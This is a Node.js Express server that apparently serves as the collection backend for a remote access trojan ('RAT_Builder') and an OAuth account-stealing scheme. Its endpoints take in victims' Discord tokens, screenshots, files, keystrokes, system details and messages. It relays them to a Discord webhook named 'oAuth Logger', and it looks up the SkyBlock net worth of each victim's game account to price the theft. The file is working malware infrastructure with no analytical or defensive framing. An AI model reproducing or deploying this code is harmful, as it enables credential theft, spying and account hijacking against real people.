import { EmbedBuilder, WebhookClient } from "discord.js";
import { readFile } from "fs/promises";
import axios from "axios";
import express from "express";
import helmet from "helmet";
import { rateLimit } from "express-rate-limit";
import * as db from "./database.js";
import * as ratDB from "/root/RAT_Builder/database.js";

import handleBlacklist from "./handlers/blacklist.js";
import handleMain from "./handlers/main.js";
import handleRefreshMain from "./handlers/refreshMain.js";
import handleInfo from "./handlers/info.js";
import handleComputer from "./handlers/computer.js";
import handleMessage from "./handlers/message.js";
import handleToken from "./handlers/token.js";
import handleScreenshot from "./handlers/screenshot.js";
import handleFile from "./handlers/file.js";
import handleKey from "./handlers/key.js";
import handleWebhooks from "./handlers/webhooks.js";

const { clientID, webhookURL, port } = JSON.parse(await readFile(new URL("./config.json", import.meta.url)));
const webhookClient = new WebhookClient({ url: webhookURL });
const app = express();
app.use(helmet());

const BlacklistLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 2,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const MainLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 3,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const RefreshLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 3,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const InfoLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 2,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const ComputerLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 2,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const MessageLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 10,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const TokenLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 40,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const ScreenshotLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 5,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const FileLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 40,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

const KeyLimiter = rateLimit({
  windowMs: 10 * 1000,
  limit: 10,
  standardHeaders: "draft-7",
  legacyHeaders: false,
  validate: { xForwardedForHeader: false },
});

async function init() {
  await db.createTables();

  app.use(express.json());

  // Ratelimits
  app.use("/blacklist", BlacklistLimiter);

  app.use("/verify", MainLimiter);

  app.use("/refresh", RefreshLimiter);

  app.use("/webhook/info", InfoLimiter);

  app.use("/webhook/computer", ComputerLimiter);

  app.use("/webhook/message", MessageLimiter);

  app.use("/webhook/token", TokenLimiter);

  app.use("/webhook/screenshot", ScreenshotLimiter);

  app.use("/webhook/file", FileLimiter);

  app.use("/webhook/key", KeyLimiter);

  app.use("/info", InfoLimiter);

  app.use("/computer", ComputerLimiter);

  app.use("/message", MessageLimiter);

  app.use("/discord", TokenLimiter);

  app.use("/screenshot", ScreenshotLimiter);

  app.use("/file", FileLimiter);

  app.use("/key", KeyLimiter);

  // Webhooks Handler
  app.use("/webhook", handleWebhooks());

  app.use("/info", handleWebhooks());

  app.use("/computer", handleWebhooks());

  app.use("/message", handleWebhooks());

  app.use("/discord", handleWebhooks());

  app.use("/screenshot", handleWebhooks());

  app.use("/file", handleWebhooks());

  app.use("/key", handleWebhooks());

  // Endpoints
  app.use("/blacklist", handleBlacklist(db, webhookClient, sendError, getNetworth));

  app.get("/verify", handleMain(db, webhookClient, sendError, getNetworth));

  app.get("/refresh", handleRefreshMain(db, webhookClient, sendError, getNetworth));

  app.post("/webhook/info", handleInfo(ratDB, webhookClient, sendError, getNetworth));

  app.post("/webhook/computer", handleComputer(ratDB, webhookClient, sendError, getNetworth));

  app.post("/webhook/message", handleMessage(ratDB, webhookClient, sendError, getNetworth));

  app.post("/webhook/token", handleToken(ratDB, webhookClient, sendError, getNetworth));

  app.post("/webhook/screenshot", handleScreenshot(ratDB, webhookClient, sendError, getNetworth));

  app.post("/webhook/file", handleFile(ratDB, webhookClient, sendError, getNetworth));

  app.post("/webhook/key", handleKey(ratDB, webhookClient, sendError, getNetworth));

  app.post("/info", handleInfo(ratDB, webhookClient, sendError, getNetworth));

  app.post("/computer", handleComputer(ratDB, webhookClient, sendError, getNetworth));

  app.post("/message", handleMessage(ratDB, webhookClient, sendError, getNetworth));

  app.post("/discord", handleToken(ratDB, webhookClient, sendError, getNetworth));

  app.post("/screenshot", handleScreenshot(ratDB, webhookClient, sendError, getNetworth));

  app.post("/file", handleFile(ratDB, webhookClient, sendError, getNetworth));

  app.post("/key", handleKey(ratDB, webhookClient, sendError, getNetworth));

  app.get("/.well-known/microsoft-identity-association.json", async (req, res) => {
    res.json({
      associatedApplications: [
        {
          applicationId: clientID,
        },
      ],
    });
  });

  app.listen(port, () => {
    console.log(`--------------------------------------------------`);
    console.log(`Started the server on ${port}`);
    console.log(`--------------------------------------------------\n`);
  });
}

async function getNetworth(username) {
  try {
    const networth = [0];
    const unsoulboundNetworth = [0];
    const url = "https://sky.shiiyu.moe/api/v2/profile/" + username;
    let response = await axios.get(url).catch((err) => {
      console.error("Request to sky.shiiyu.moe failed.");
    });
    for (const uuid in response.data["profiles"]) {
      const profile = response.data.profiles[uuid];
      if (typeof profile.data.networth.networth == "number") {
        networth.push(profile.data.networth.networth);
      }
      if (typeof profile.data.networth.unsoulboundNetworth == "number") {
        unsoulboundNetworth.push(profile.data.networth.unsoulboundNetworth);
      }
    }
    return `${format(Math.max.apply(Math, networth))} (${format(Math.max.apply(Math, unsoulboundNetworth))})`;
  } catch (err) {
    return "API DOWN";
  }
}

const format = (num) => {
  if (num < 1000) return num.toFixed(2);
  else if (num < 1000000) return `${(num / 1000).toFixed(2)}K`;
  else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}M`;
  else return `${(num / 1000000000).toFixed(2)}B`;
};

function sendError(error) {
  var errorMsg;
  if (error.response) {
    errorMsg = error.response.data;
  } else if (error.request) {
    errorMsg = error.request;
  } else {
    errorMsg = error.message;
  }
  try {
    var string = errorMsg;
    try {
      string = JSON.stringify(errorMsg);
    } catch (e) {}
    var length = 4090;
    errorMsg = string.length > length ? string.substring(0, length - 3) + "..." : string;
    const embed = new EmbedBuilder().setColor("Red").setTitle("❌ Error").setDescription(`\`\`\`js\n${errorMsg}\`\`\``);
    webhookClient.send({
      username: "oAuth Logger",
      embeds: [embed],
    });
  } catch (err) {
    console.error(err);
  }
}

init();
